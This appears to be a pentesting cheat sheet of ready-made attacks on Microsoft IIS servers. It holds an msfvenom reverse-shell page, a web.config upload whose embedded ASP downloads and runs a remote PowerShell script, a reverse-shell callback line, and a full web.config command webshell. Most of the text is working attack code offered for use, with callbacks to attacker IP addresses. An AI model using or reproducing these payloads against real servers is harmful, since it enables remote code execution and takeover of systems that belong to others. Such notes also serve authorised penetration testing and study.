## IIS - Microsoft WebServer

### Reverse Shell Page

Try aspx if asp doesn't work

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 -f asp -o reverse_tcp_8000.asp
```

### Web.config Files

#### Test File

Use this to check if you can run executable code in the web.config file, it should print '3':

```powershell
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

src: https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/

#### Remote Powershell Script

1. Upload this code as web.config

   ```powershell
   <?xml version="1.0" encoding="UTF-8"?>
   <configuration>
      <system.webServer>
         <handlers accessPolicy="Read, Script, Write">
            <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
         </handlers>
         <security>
            <requestFiltering>
               <fileExtensions>
                  <remove fileExtension=".config" />
               </fileExtensions>
               <hiddenSegments>
                  <remove segment="web.config" />
               </hiddenSegments>
            </requestFiltering>
         </security>
      </system.webServer>
   </configuration>
   <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
   <%
   Set obj = CreateObject("WScript.Shell")
   obj.Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.37/shell.ps1')")
   %>
   -->
   ```

2. Host a Powershell script on a web server like Invoke-PowerShellTcp to execute the script, but you need to add a line at the end to execute the function:

   ```powershell
   <SNIPPED>
   	catch
       {
           Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
           Write-Error $_
       }
   }
   
   ### Added code to execute function
   Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 8000
   ```

#### Command Webshell

Usage : http://domain.com/path/to/web.config?cmd=dir, or just visit the page and use the form on it to run a command.

```powershell
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
 
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's IP:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
<b>Command Output:</b>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
```

src: https://gist.github.com/gaitonde-bhau/8e1e46f005415a5bf20dcbd28129534a

### Other Ideas

https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/

https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/